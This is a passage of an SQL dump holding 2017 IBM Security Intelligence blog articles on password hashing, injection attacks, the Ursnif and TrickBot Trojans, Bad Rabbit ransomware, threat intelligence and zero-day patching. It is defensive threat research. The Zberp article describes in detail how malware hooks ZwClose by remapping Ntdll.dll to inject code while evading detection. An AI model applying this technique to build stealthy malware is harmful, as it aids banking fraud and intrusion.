1,000 users that had the same hash, the top eight breakdown goes something like this:\n When doing development, you should always choose your hashing algorithms wisely and never blindly trust code that someone has checked into a GitHub code repository. Always review   best practices before implementing hashing in your code. Don’t ever make up hashing or encryption functions.\n At the very least, have a human analyst conduct a   against your code. It’s better to test your security and shed light on your own vulnerabilities than to be the next victim of a headline-grabbing data leak.', '\'Application Security Testing\', \'Encryption\', \'Encryption Keys\', \'Password Management\', \'Password Protection\', \'Password Reuse\', \'Passwords\', \'SHA-1\'', 'https://securityintelligence.com/how-not-to-store-passwords-sha-1-fails-again/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (63, 'Injection Attacks: The Least Glamorous Attack Is One of the Most Threatening', 'Michelle Alvarez', '2017-11-2', 'Very little in life grabs our attention like a shiny new object. The gleam can be irresistible, the glitter mesmerizing. That’s how it is in cybersecurity, where the landscape is almost always dotted with alluringly novel hazards. Brand new threats, fresh twists on old threats — the shiny malicious objects just keep on coming, year in and year out. 2017 brought us threats such as the  ,   and  , all with very   and warranting immediate remediation. Behind the attention grabbers, however, lurked a less newsworthy but much more widespread and persistent threat, ranking, once again, as the top mechanism of attack targeting many organizations in every sector: injection attacks. \n The facts are clear. According to IBM X-Force analysis of   data, injection attacks are the most frequently employed mechanism of attack against organizational networks. In fact, for the period assessed (January 2016 through June 2017), injection attacks made up nearly half — 47 percent — of all attacks. The most common types were operating system command injection (OS CMDi) and SQL injection (SQLi). \n Attackers take advantage of   in operating systems and applications to penetrate critical web servers and access back-end databases. From using malicious webshells to planting cryptocurrency mining tools or malicious PHP scripts, there are many ways in which cybercriminals can use injection attacks to reach their end goal. Fortunately, addressing injection attacks doesn’t necessarily require heavy lifting. Implementing a few basic security measures can help mitigate the threat in your environment. While several types of injection attack patterns fall under the MITRE Corporation’s Common Attack Pattern Enumeration and Classification (CAPEC)  , the following patterns were the most prominent vectors targeting clients monitored by IBM X-Force. Interestingly, some of the most prevalent activity involved the exploitation of vulnerabilities that were two or more years old. \n The root cause of many high-profile breaches often involves the exploitation of weaknesses that could have been remediated or addressed, such as password reuse,   and unpatched vulnerabilities. The same can be said for many successful injection attacks. For more information about injection attacks and recommendations on how to mitigate them, read the IBM X-Force Research report, “ .”', '\'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'Injection Attacks\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/injection-attacks-the-least-glamorous-attack-is-one-of-the-most-threatening/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (64, 'Ursnif Campaign Waves Breaking on Japanese Shores', 'Limor Kessem', '2017-10-26', 'According to   data on the activity of financial malware operated by organized cybercrime groups, the Ursnif (aka Gozi) banking Trojan was the most active malware code in the financial sector in 2016 and has maintained its dominance through 2017 to date. Ursnif’s activity is marked by both frequent code modifications and campaign activity in North America, Europe and Australia. But one of its most popular targets in 2017 has been Japanese banks, where Ursnif’s operators were very active in late Q3 2017, starting in September. The threat actors continue to spam users in the region regularly as we move into Q4. \n In terms of targets, Ursnif malware configurations can be a mixed bag at times, but those targeting Japan are specific to banks and payment card providers in the country. That list of targets remained unchanged through the different campaigns, suggesting that the same actors are likely behind it. In addition to banks, the active Ursnif variant in Japan also targets user credentials for local webmail, cloud storage,   and e-commerce sites. In terms of the attack tactics employed against Japanese users, X-Force analysis points to data grabbing from secure sessions, webinjection attacks and, in some cases, page redirections. Previous tactics, such as video grabbing, are not presently featured, which could suggest that the actors are local or quite familiar with the banking systems in Japan. The delivery method of Ursnif payloads in Japan has been rather consistent throughout the campaigns observed this summer, featuring   purporting to come from financial services and payment card providers in Japan. \n In other malspam versions, users receive an HTML link that leads to an archive (.zip) file containing JavaScript, which launches a PowerShell script that fetches the payload from a remote server and infects the user with Ursnif. The payload appears to be served from web resources the attackers registered to serve the malicious code, not from hijacked domains. \n Recent Ursnif malspam campaigns used a   that launches PowerShell only after the user closes the malicious file. This method helps the malware evade sandbox detection. X-Force data revealed that campaign email spikes take place in cyclical weekly rounds, usually peaking on Tuesday evenings. Attempted infections peak on Thursdays and Fridays and are relatively low during the weekend and early weekdays. Ursnif’s operators do not exclusively use malspam. In other regions where they target banks, such as the U.K., they work with the   to infect users via malvertising campaigns. Why do organized crime groups spread to new geographies? In most cases of malware migration, cybercriminal groups with adequate resources are looking for easier money, less security and an element of surprise for users who are less accustomed to their spam ploys and social engineering during the banking session. The history of organized cybercrime in Japan is not very long. The past five years featured more generic malware and local attackers using   more than anything else. The situation took a turn for the worse in the summer of 2015, when the   emerged and made Japan one of its top targets. Shifu’s activity in Japan died out slowly and eventually  , but it was one of the pivotal organized cybercrime groups that opened the floodgates to other cybercrime actors such as  ,   and a step-up in Ursnif attacks. Shifu did that by setting up the spamming and social engineering foundations for other malware that came after it, often copying its tools and likely collaborating with the same local groups. So why have other organized groups such as Dridex and TrickBot, both of which target banks in as many as 40 countries, largely stayed away from Japan? The answer could lie in the connections other gangs have with local cybercrime and money-laundering groups. Even on the internet, gangs often stick to their own turf. When   was discovered in 2007, it was operated by an exclusive group of threat actors to perpetrate online banking wire fraud in English-speaking countries. In 2010, one of the developers working on an upgrade to Ursnif v2 accidentally leaked the code, which was repurposed by other fraudsters to create banking Trojans such as Vawtrak and Neverquest. Toward the end of 2010, the original Ursnif v2 began using webinjection techniques against banks in Europe, the U.K. and the U.S. The malware operators added a master boot record (MBR) rootkit in mid-2013 to create high persistency through the computer’s MBR. Ursnif v2’s online fraud capabilities are enabled through: Ursnif v2 leverages the   feature, which can essentially be activated at the attacker’s discretion. X-Force researchers analyzed Ursnif’s VNC module to uncover its architecture and inner workings. Another known Ursnif module is the use of Tor to route the malware’s communications through an anonymized service. In one notable case, Ursnif was linked with another banking Trojan when its fraud module was built into the  , which IBM X-Force Research discovered in April 2016. GozNym’s code is made of the Nymaim malware embedded with the Gozi financial fraud module, effectively creating a   that was believed to be operated by an organized cybergang. The   led to GozNym’s demise in late 2016. The following chart lists the most prolific banking malware families in 2017 per attack volume. \n \n After the decline of   in 2017, Ursnif climbed up to the third, then second rank globally. Ursnif’s prevalence is also connected with its widening geographical scope. In 2017, for example, the malware presented configurations targeting banks in  , Poland, Spain and the Czech Republic, in addition to its targets in North America, Australia and Japan. In terms of its development cycles, Ursnif was the most active malware project in 2016, topping other banking Trojans with the largest number of updates made to its loader and binary to evade security research and detection. It has kept its position so far in 2017. IBM X-Force noted that Ursnif has been one of the most active banking Trojans in Japan over the past five years. Our researchers have also been tracking a third version of Ursnif targeting banks in Australia. Stay tuned for upcoming information.', '\'Banking\', \'Banking Malware\', \'Banking Trojan\', \'Financial Industry\', \'Gozi\', \'Gozi Trojan\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\'', 'https://securityintelligence.com/ursnif-campaign-waves-breaking-on-japanese-shores/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (65, 'Bad Rabbit Ransomware Attacks Highlight Risk of Propagating Malware Outbreaks', 'Limor Kessem', '2017-10-25', 'On Tuesday morning, Oct. 24, 2017, organizations in Russia and Ukraine reported being hit with a ransomware outbreak that paralyzed their operations. Sporadic cases were also recorded in Turkey, Germany, Bulgaria and Japan, according to   from different sources. The malware, self-titled Bad Rabbit, is a ransomware code designed to encrypt and lock files on endpoints, then demand payment for their release. Bad Rabbit is also the name of a Dark Web site where victims are led to pay to have their files unlocked. At the time of this writing, Bad Rabbit is understood to have mostly hit organizations in Russia. More specifically, it is breaking out on media outlets in the country. In   delivered by some of the affected entities, it was reported that servers were down due to the ongoing attack. In Ukraine, the attack hit   in the transport sector. One of the victims is the Odessa airport, which is located in the third-largest city in the country, causing flight delays due to manual processing of passenger data. Ukraine also saw its subway system affected, causing payment delays on customer service terminals, although trains continued to run normally. Bad Rabbit is the third disruptive ransomware outbreak this year, following the   and   worms that affected numerous organizations in the second quarter of 2017. That being said, Bad Rabbit’s propagation technique is not based on the same exploits, which may make it easier to contain overall. \n Based on currently available information, unlike most financially motivated ransomware, Bad Rabbit does not spread via email. According to  , which analyzes billions of spam and malspam messages, Bad Rabbit was not sent in an email campaign. Some voices in the security community reckon that the outbreak is a targeted attack that may have been months in the making, but that’s yet to be confirmed. To reach user endpoints, Bad Rabbit’s operators compromised news and media sites to have visitors redirected to malicious landing pages they control. On those pages, users were advised to install an Adobe Flash update, at which point a malicious download took place, delivering the malware dropper in what’s called a drive-by attack — not requesting any action to drop a file into the endpoint. Those who went ahead and executed the file unknowingly unleashed the malware on their endpoints and saw their files encrypted. The malware operators’ note demands 0.05 BTC in ransom to unlock the files. According to information from the security community, websites used to propagate the malware were   that were used for distributing the NotPetya malware in June 2017. That network of predetermined websites was apparently being set up over time  . A noteworthy mention by one security vendor reported that all companies were infected  . That vendor speculated that attackers might already be in some of the victims’ systems. In that case, would the attackers not be able to launch the malware directly? This question raises another option: Is it possible that at least one targeted email was sent to each victim with a lure to get them to one of the infected media sites in a watering hole-style attack? Once there was one infected user, the malware could have propagated onward from patient zero. Bad Rabbit spreads across networks using some tools to help it get to additional endpoints. According to IBM X-Force, the malware uses a Windows SMB feature, but it is unrelated to the   by the EternalBlue exploit. Our researchers are also seeing the malware issue HTTP OPTIONS requests on port 80 for /admin$, suggesting the use of WebDAV as part of the scheme. Moreover, Bad Rabbit appears to leverage the   — which was built as a testing tool and not for malicious purposes, but is often used by attackers nonetheless — to retrieve the passwords of other users on the network. The malware also had some basic hardcoded passwords. Oddly enough, those were supposedly the most popular passwords used, according to the 1995 movie “Hackers.” Bad Rabbit demands 0.05 BTC in ransom to release the lock placed on encrypted files. At the time of this writing, 1 BTC goes for approximately $5,450, meaning that the initial ransom demand would be roughly $273. The ransom note appears on the infected endpoint’s screen, directing the user to access a dedicated web service. Once on the attacker’s website, which is hosted on the Tor network to keep the communication anonymized, the victim is warned that he or she only has about 41 hours to pay. The victim is then shown a countdown clock that awaits a “password” — the decryption key to unlock his or her files. At the time of this notice, it has not been confirmed that the attackers can indeed decrypt the files. The Bad Rabbit attacks are developing as security vendors release more information and organizations learn more and contain the attacks. If you’re an IBM customer, please browse to X-Force Exchange for a dedicated page on   with IBM Security products. For technical updates directly from IBM Security’s X-Force Research, please access our  , where our research and incident response teams will provide information as this situation unfolds. All organizations are strongly advised to inform employees about the outbreak, explain the flow of infection and remain extremely vigilant about Bad Rabbit in the coming hours and days. Bad Rabbit has not affected companies in the U.S. as of the time of this release, although one antivirus vendor indicated that its telemetry is showing some infections in the U.S. Given this, if any sign of infection does occur, inform the FBI’s   upon discovering it. Outside the U.S., organizations are encouraged to inform their Community Emergency Response Team (CERT) and e-crime police about any infections linked with the Bad Rabbit campaign. If you believe your company has been impacted and you need assistance, please call your IBM X-Force 24×7 Incident Response Hotline: UAE: (+971) 800 044 424 17\n USA: (+1) 888 241 9812\n Denmark: (+45) 4331 4987\n Finland: (+358) 9725 22099\n Latvia: (+371) 6616 3849\n Norway: (+47) 2302 4798\n Saudi Arabia: (+966) 800 844 3872\n Saudi Arabia: (+966) 800 850 0399\n Sweden: (+46) 8502 52313\n UK: (+44) 20 3684 4872\n According to an  , 70 percent of businesses previously hit by ransomware indicated that they had paid the ransom to recover company data. Of that portion, 50 percent paid over $10,000, and 20 percent paid over $40,000. It’s important to note that paying attackers does not guarantee regaining access. Organizations and individuals affected by Bad Rabbit are   the attackers. As of the time of this writing, antivirus vendors have released signatures and some decryption options that can help unlock encrypted files. The attack was most likely designed for disruption rather than financial gain. More advice about containment and IBM product coverage will be made available in the coming hours. For general advice on keeping your systems safe from ransomware, please review our  .', '\'Cyberattack\', \'Cybercrime\', \'IBM X-Force Research\', \'Malware\', \'Ransomware\', \'Threat Intelligence\'', 'https://securityintelligence.com/bad-rabbit-ransomware-attacks-highlight-risk-of-propagating-malware-outbreaks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (66, 'Threat Intelligence: A Tear-Free Solution to Help SOC Analysts Prepare for the Next WannaCry', 'Christian Falco', '2017-10-25', 'It’s been nearly six months since the WannaCry ransomware stole global headlines and thousands of security practitioners flocked to threat intelligence feeds to help streamline their investigations. While the security community has learned many   from the attack, it’s impossible to say that a strike of this magnitude won’t happen again. The average   still sits north of $3.6 million, so the return on a successful cyberattack merits the risk in the cybercrime market. Make sure your threat intelligence solution can provide the following capabilities to help you address, track and investigate the next big attack if and when it occurs. Despite the shock, WannaCry was yet another exploit of a known vulnerability. In fact, Microsoft had issued a patch for the flaw two months earlier. An effective threat intelligence solution should allow you to stay up to date on all vulnerability releases specific to your enterprise platforms so you can prevent instead of respond. \n Security analysts have their go-to repositories and third-party feeds to obtain the latest threat intelligence. A   should be able to consolidate this information to supply both machine-generated, tactical intelligence — such as malicious IPs, URLs, vulnerabilities and malware — and human-generated, strategic intelligence — such as actors, campaigns, tactics, and technology and procedures (TTPs). When a breach of WannaCry’s magnitude strikes, context provided by this information is the key to helping security analysts accelerate decision-making. A threat intelligence solution should be able to quickly turn insight into action, with access to an application program interface (API) to integrate relevant threat data into security tools. The API should be flexible and support open standards such as STIX/TAXII for easy integration into existing solutions. This helps streamline investigations and threat research in the security operations center (SOC). Don’t be outmatched by collaborative cybergangs. Security investigation is a team game, and it requires a platform that enables both   to orchestrate workflows and structure response. Whether it’s building a private group, adding proprietary threat research or organizing by subgroups, make sure your threat intelligence platform can support collaboration in the SOC. In 2016, the IBM X-Force Research team revealed that nearly   contained ransomware. Before you click the next suspicious attachment, gain assurance with a cloud-based, scalable   that provides behavior-based visibility and detailed reporting to help you take action. As malware becomes trickier and more evasive, gaining insight into malicious files traversing the network becomes a priority. During WannaCry, security analysts and researchers from around the world leveraged intelligence sharing tools to follow and integrate  . Solutions that offer watchlist functionality, a representational state transfer (REST)-based API that supports open standards, third-party integrations for additional context, public and private groups to enable collaboration, and a malware sandbox to help scan suspicious files deliver the right capabilities to help your SOC get through both the normal days and the inevitable chaos. Watch our on-demand webinar, “ ,” to learn how you can put X-Force Exchange to work during the next big outbreak.', '\'Advanced Threats\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Incident Response (IR)\', \'Malware\', \'Patch Management\', \'Ransomware\', \'Threat Intelligence\', \'Threat Sharing\', \'Vulnerabilities\', \'Vulnerability Management\', \'WannaCry\'', 'https://securityintelligence.com/threat-intelligence-a-tear-free-solution-to-help-soc-analysis-prepare-for-the-next-wannacry/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (67, 'Practice: The Best Defense for Responding to Cyber Incidents', 'Kelly Kane', '2017-10-17', 'First responders have proven time and time again the valuable help they provide to people in need. Right now, we’re seeing their bravery with the historic hurricanes, fires and floods impacting millions of people. What makes first responders confident in the face of such danger? One word: practice. And this lesson is translating to the private sector in areas you wouldn’t normally expect. One area is in cybersecurity, where tabletop exercises have been the norm for the past decade to  . These paper-based exercises are kind of like a table read that actors do before they film a movie or TV show. They can be dry, lacking authentic feeling or emotion. Last year IBM introduced the world to the   at IBM X-Force Command in Cambridge, Massachusetts. The facility immerses teams from all walks of a company — security, boards of directors, IT, HR, legal, communications, etc. — into a real-life cyberattack. The experience teaches the importance of leadership in crisis and the critical role of communications during an incident. The need to practice is acute, with 2 out of 3 security professionals admitting in a   that their organizations aren’t prepared to appropriately respond to a cyberattack. Some recent headline-making data breaches have shown that the   can often make it worse for the impacted company. NBC’s Today Show was recently given exclusive access to an exercise run for 30 members of the Financial Services Information Sharing and Analysis Center (FS-ISAC). Members experienced a cyberattack on a fictitious bank and were thrown into action over several hours. See how they responded and the lessons learned. To learn more about IBM X-Force Incident Response and Intelligence Services (IRIS), please visit the  .', '\'Cyber Resiliency\', \'IBM Cyber Range\', \'IBM Security\', \'IBM X-Force Command Center\', \'IBM X-Force Incident Response and Intelligence Services\', \'Incident Response (IR)\'', 'https://securityintelligence.com/practice-the-best-defense-for-responding-to-cyber-incidents/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (68, 'Don’t Just Put Out the Zero-Day Fire — Get Rid of the Fuel', 'Michelle Alvarez', '2017-10-17', 'How often have you heard a co-worker say that he or she had to put out a fire? Depending on your job role, you may have anywhere from one to more than a dozen so-called fires weekly. A zero-day vulnerability is an example of a work-related fire that a security operations analyst might have to extinguish. Enterprises should be prepared to handle zero-day fires and seek to reduce the number of incidents that result from unpatched security vulnerabilities. After all, many of the successful breaches of the past decade caught fire before anyone ever spotted the smoke. One of 2017’s most troublesome zero-day flaws is the Apache Struts 2 vulnerability, which was disclosed in March ( ). Defined as critical, this vulnerability, if exploited, can allow a remote attacker to   on a compromised server. The black-hat community quickly leveraged this vulnerability and set up distributed attack mechanisms to use it in malicious activities. At its peak, according to IBM Managed Security Services (MSS) data, attack activity targeting clients monitored by X-Force   above the average number of similar attacks for the time period assessed. This vulnerability certainly is worrisome, but it is a small part of the overall picture. If you’re only addressing zero-day fires, you might miss out on all the other vulnerabilities that fuel a much larger percentage of attacks. Case in point: Did you know that, according to  , there are 75 Apache Struts vulnerabilities dating back more than a decade? We know that attackers don’t just exploit the new threats — they exploit what works, old and new alike. It’s no surprise, then, that analysis of IBM MSS data from January through September 2017 shows that nearly half of all attack activity — 46 percent — included about two dozen other Apache Struts 2 vulnerabilities, some dating back to 2010. This example is not an anomaly. We see similar scenarios play out across most applications, servers and operating systems. For any given zero-day flaw, there are dozens, sometimes hundreds, of exploits targeting a vulnerability in a particular software or hardware that could lead to a breach or compromise if left unpatched. The issue is further exacerbated when users keep applications they hardly use on their endpoints or mobile devices and fail to update them, opening themselves up to additional threats. The notion that where there’s smoke, there’s fire is not necessarily applicable to the exploitation of a zero-day flaw. Zero-day exploits often spring up, like spontaneous combustion, with no warning. If you’re trolling around in underground cybercriminal channels, you might hear some rumblings before it hits the mainstream. Still, most enterprises aren’t aware of zero-day flaws until they are exploited. Many of the zero-day vulnerabilities that attackers choose to exploit are the ones that generate the most bang for their buck — that is, affect the largest pool of potential victims — and have ease of exploitation. To mitigate zero-day threats, organizations should implement the following strategies. It’s important to note that zero-day flaws are just vulnerabilities for which there is no patch. Most won’t necessarily be considered critical in your environment. That’s why the time to begin identifying which IT assets could potentially be impacted is before a zero-day vulnerability is actively exploited. An   program manages the life cycle and inventory of IT assets, both software and hardware. Without one, you are basically in the dark when it comes to risk to exposure. It’s not just about knowing what’s installed in your environment — it’s knowing when software or hardware is no longer needed and taking action to uninstall those IT assets accordingly. An effective threat detection solution that conducts deep analysis in real time can help security teams quickly identify zero-day attacks. Traditional means of detection and prevention may be blind to new exploits, but security information and event management (SIEM) solutions can help you identify the symptoms to enable timely detection and remediation. If you’re compromised by a zero-day attack, ask yourself what’s worse: a big fire or a small flame? A comprehensive   can help you shift your security stance from reactive to proactive, potentially saving a great deal of time and money. According to the “ ,” “an incident response team reduced the cost by as much as $19 per compromised record.” Your IRP should be a dynamic document that is reviewed regularly. Even for organizations that strive to apply every patch, sometimes there is no fix immediately available. There are, however, typically workarounds to compensate for the lack of a patch in the interim. This may not always be practical because many IT environments are complex. Conduct a risk assessment of the threat in the context of your organization to make decisions about reducing exposure and applying controls.  said it best: “Most breaches we become aware of are caused by failure to update software components that are known to be vulnerable for months or even years.” Indeed, one of this year’s most notorious threats had a patch available prior to the actual outbreak. Although a   had been available since March 2017, the   began impacting organizations globally in May. To stay on top of the vulnerabilities most likely to impact their organizations, security professionals should follow the steps and processes outlined below. Many organizations fail to sufficiently monitor published vulnerabilities that may affect the technology protecting their data. As a result, they are unaware of the risk and potential impact of a data breach. Solutions that scan data infrastructures to   and exposures such as missing patches, weak passwords, unauthorized changes and misconfigured privileges can help identify threats and security gaps. It’s not enough to just scan for vulnerabilities. Timely patch management is vital in organizations of all sizes. Security intelligence and data analytics tools, along with   solutions, can help bridge the gap between scanning and remediation activities. Traditional security assessments often fail to identify outside-the-norm vulnerabilities. Consider augmenting the massive quantities of vulnerability reports, whether performed in-house or by a third party, with  . It’s important to set up a thorough security testing program to evaluate all your potential threat targets, including your network and embedded devices, hardware, applications and humans. If your organization wishes to focus its testing plan, it can tailor the project to include only the systems most exposed to the threats documented in your recent assessments. Moreover, the organization can mandate a white-box test to further save on time and costs. While the scope of this testing depends on the organization’s risk appetite, it should be a part of any security program that aims to minimize business risk. No, we didn’t start the fire — but we have to do our best to prevent fires, or at least contain and extinguish them. Fires garner attention because they are big, bright, destructive and capable of expanding rapidly. The same goes for security threats. But, like fires, many security incidents are preventable. Examine your digital   to see if you’re prepared to address critical zero-day fires and the unpatched vulnerabilities that fuel them.', '\'Apache\', \'Patch\', \'Patch Management\', \'Vulnerabilities\', \'Vulnerability Management\', \'Zero-Day Attacks\', \'Zero-Day Exploit\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/dont-just-put-out-the-zero-day-fire-get-rid-of-the-fuel/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (69, 'Diving Into Zberp’s Unconventional Process Injection Technique', 'Pavel Asinovsky', '2017-10-16', 'IBM X-Force Research recently discovered a small-scale malware campaign involving a Neutrino bot, aka Kasidet, dropping a payload that contains two Zeus malware breeds: Atmos and Zberp. Both of these codes are based on the leaked source code of the Zeus V2 banking Trojan that was   in 2011. The Zberp Trojan, which is a subvariant of ZeusVM mixed with code from the  , was   and named by IBM X-Force in May 2014. Zberp uses most of ZeusVM’s core financial capabilities, such as a steganography technique to hide its configuration file, an invisible persistence mechanism and, notably, a unique process injection technique and an API hooking mechanism taken from Carberp. This has made Zberp one of the stealthiest Zeus-based financial Trojans ever seen in the wild. Although the recent campaign featured a new Zberp variant, the payload itself did not feature major changes. This reinforces the belief that the malware remained rather static from the time it was first discovered. Throughout the past three years, Zberp’s operators remained relatively quiet and did not launch the malware into large infection campaigns, so it was not a surprise to see it emerge in a relatively small campaign. That said, Zberp does feature some interesting aspects due to the mix of code chunks it copied from Carberp, particularly its code injection technique. Let’s take a closer look. \n Code injection is one of the top tactics used by malware authors, making its detection crucial for many security solutions. Injecting code into otherwise legitimate system processes allows the malware to become more evasive by running from a trusted resource, thus hiding itself from the user’s eyes and thwarting detection by process-specific security mechanisms. Furthermore, the core capabilities of financial malware, such as webinjections, form grabbing and redirect attacks, are achieved using API function hooks from within the web browser’s process, routing the execution flow through injected malicious code. Code injection, in many cases, is the basis of what a financial malware can do once it lands in a newly infected endpoint. To detect the activity of malicious code, security solutions often monitor API function calls that are affiliated with process injection techniques. For example, the VirtualAllocEx and WriteProcessMemory APIs are used in most code injection techniques. These APIs allocate space and write the payload to the remote process, and the CreateRemoteThread API is often used to execute it. In pursuit of becoming more evasive, some malware authors try to use alternative techniques that don’t involve typical process injection APIs. One such method is the recently discovered  , which was adopted by the infamous Dridex malware. When it comes to code injection, Carberp’s developer had an interesting way to go about the process. The malware’s source code was  , revealing how Carberp used a variety of standard process injection routines. This involved using   or the CreateRemoteThread API, which didn’t differ much from other competing banking Trojans, along with a few other tricks. But to overcome the more advanced breed of protection mechanisms of that era, Carberp had to invent a brand new injection technique. That technique was later adapted by Zberp’s developers to become the primary injection method to all user-mode processes. To evade security mechanisms that would detect suspicious API calls, Carberp’s authors were quite determined to create a thread in a remote process without using APC or the CreateRemoteThread API. They even   in 2013, claiming it was the workaround that could bypass IBM Trusteer’s antifraud product, Rapport, but that was unproven. One way for Carberp’s developers to implement the trick was to remotely set up a hook on a frequently used API — in our case, ZwClose. Whenever this API was called from any thread in the targeted process, the hook detoured execution to a shellcode function that created a new local thread from within the target process and immediately fixed the hook. Creating such a hook is not trivial — it requires thread safety considerations, since two threads will attempt to modify the code and fix the hook at the same time. In the process, one thread can interfere with the other, and it may lead to unexpected behavior that can cause the program to crash. Another issue the malware’s authors had to address was memory protection. Since the memory pages of the code section in system dynamic link libraries (DLLs) have the access rights of PAGE_EXECUTE_READ (0x20), the access rights must be adjusted before attempting to write any payload or modify the code to set a hook. Otherwise, an access violation error will be raised and the program will crash. \n Zberp is implemented in a four-step process, which is broken down and explained in granular detail below. As a preparatory step, Zberp uses a rather standard way of writing the payload to the targeted process: It allocates a PAGE_EXECUTE_READWRITE memory block using VirtualAllocEx and writes its own executable into the target process using WriteProcessMemory. Next, it copies a structure to a predefined offset in the copied module. This is supplemented with essential data for the shellcode, which contains the first six bytes from the beginning of ZwClose, also known as a  . Unlike permanent hooks, where the trampoline is used to call the original API function, this trampoline simply stores the original data for fixing the hook once it was executed. \n The malware begins by calculating the size of Ntdll.dll and calling the API functions CreateFileMappingW and MapViewOfFile with PAGE_EXECUTE_READWRITE access rights. This step creates an empty file mapping with the size of Ntdll.dll that will be mapped to the malware process’s memory space. Now that the trampoline is set and the file mapping is ready, the malware is ready to patch ZwClose. First, the malware suspends the target process by calling NtSuspendProcess. It then uses ReadProcessMemory to make a replica of the target process’s Ntdll.dll into the file mapping in its own memory space. Before setting the hook itself, the malware needs to calculate two addresses: the address of ZwClose in the file mapping so it will have the address that needs to be patched and the address of the shellcode function in the remote process so it will know where the hook should point to. \n Next, Zberp overwrites the six bytes at the address of ZwClose in the mapped Ntdll.dll and sets the hook. The first byte is overwritten with 0x68, which is the x86 assembly push instruction. The next four bytes are the address of the shellcode function in the remote process, and the last byte is 0xC3, which is the x86 ret instruction. In other words, the shellcode address will be pushed onto the stack and the ret instruction will return to it as if it were a return address of a function. \n The final step is the most significant part. After everything has been prepared, the remote hook can be placed. Since the remote process was previously suspended, the malware can call NtUnmapViewOfSection with the address of Ntdll.dll in the remote process and then NtMapViewOfSection to map the patched Ntdll.dll instead, effectively replacing it and setting a hook on ZwClose. As soon as the hook is set, the malware calls the FlushInstructionCache API to clean the cache and make sure the code changes take place. Finally, it calls NtResumeProcess to continue the normal process execution. \n Memory protection prevents a process from accessing memory that has not been allocated to it. Since the patch was set in the file mapping and NtMapViewOfSection was called with PAGE_EXECUTE_READWRITE (0x40) access rights, the replaced Ntdll.dll has all the permissions it needs. This eliminates the need to adjust permissions by using the VirtualProtectEx API. \n An interesting feature of this technique is that it prevents debugging the target process with  . Since unmapping of an integral system DLL such as Ntdll.dll is extremely intrusive, WinDbg does not handle it properly and is forcefully detached, discontinuing the debugging process. Other debuggers, such as OllyDbg and Immunity, are not affected. \n As soon as ZwClose is called from any thread in the targeted process, the hook jumps into a shellcode function, which fixes the hook and executes the payload. Since the shellcode function does not have any prior information about the loaded DLLs in the target process, it first resolves the addresses of the API functions it needs to use, which is similar to most shellcodes. It begins by resolving the image base of Kernel32.dll from a series of undocumented structures within the  , accessed by the FS register. Then the shellcode resolves the addresses of the exported functions it needs by parsing the Kernel32.dll exports section in the PE header. To hide the hardcoded function name strings, they are stored as four-byte (DWORD) chunks that are concatenated when stored as parameters on the stack. \n Since many threads can call ZwClose and execute the same code at once, when the function modifies the code by fixing the hook one thread can affect the execution of another and cause unexpected behavior. To avoid this problem, the malware must implement a thread safety locking mechanism that allows only a single thread to modify the code at a time, while all other threads are forced to sleep. Only after the patch is completed by the first thread are the other threads allowed to resume executing the original ZwClose. \n To fix the hook, the shellcode simply copies the original six bytes from the trampoline location to the address of ZwClose in Ntdll.dll. It then uses VirtualProtect and FlushInstructionCache again to make sure the page has PAGE_EXECUTE_READWRITE access rights and that the changes took place. \n As soon as the hook is fixed, it sets the lock flag to 2 so the other sleeping threads can resume execution to the fixed ZwClose Finally, it creates a local thread to the entry point of the malware’s copied module. \n Zberp has kept a low profile over the years in terms of its attack scope by focusing on specific geographies and limiting malware spam. It is likely being used for targeted operations or as a second-stage backup malware to increase the infection chances of other malicious codes. Although the Zberp process injection technique introduced here is not new per se, it has not been analyzed or exposed fully to date. This method should be noted as robust, relatively simple and effective. The features described above make this injection tactic easy to miss for security solutions that base their detection on monitoring only certain API calls. For this research, we analyzed the following Zberp sample:', '\'Banking Trojan\', \'Carberp\', \'Carberp source code\', \'Carberp Trojan\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'Trojan\', \'Webinjection\', \'Zeus\', \'ZeusVM\'', 'https://securityintelligence.com/diving-into-zberps-unconventional-process-injection-technique/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (70, 'TrickBot Takes to Latin America, Continues to Expand Its Global Reach', 'Limor Kessem', '2017-10-11', 'The TrickBot Trojan, a banking malware believed to be operated by an organized cybercrime group, has been the most active financial Trojan in the wild all summer. For some perspective, while other malware operators were much less active in the summer months, TrickBot was three times more active than Dridex in terms of campaigns and code updates in Q3 and Q4 to date, according to  . It continues to expand its reach, this time setting foot in Latin America, with bank targets in Argentina, Chile, Colombia and Peru. At this time, the number of targets in Latin America is still small, but this strategy is typical for TrickBot’s operators, who test the waters before moving ahead to set up   and add more banks to their target lists. Recent configuration files analyzed by IBM X-Force Research show that TrickBot’s operators are still using redirection attacks for many of their targets. The ratio in recent campaigns, where TrickBot targeted banks in no less than 40 countries, was 60 percent webinjection attacks to 40 percent redirection attacks. Those are already active in all four countries in Latin America where TrickBot targets major banks. In the current cybercrime arena, according to X-Force research, the only other gangs to use redirection attacks are the operators of the   and   Trojans. \n TrickBot is delivered to potential victims via email and pushed by the  . The connection with the Necurs gang has been ongoing since mid-2017, which has led to TrickBot being delivered as various file types to conceal its payloads. Most recently, the malware switched to using an eFax ploy to trick users into opening   that harbor its payload. An X-Force analysis of the amount of spam emitted by the Necurs botnet during August and September showed that this cybercrime operation sent over 40 million emails carrying .7z archive file attachments per week in intermittent TrickBot and Locky ransomware campaigns. This is not the only method by which TrickBot was delivered in Q3. The group has been experimenting with other ideas, such as   and serving the malware from there. In early August, TrickBot was spotted using the same infection zones as the Emotet Trojan, which has been linked with the  , which recently propagated 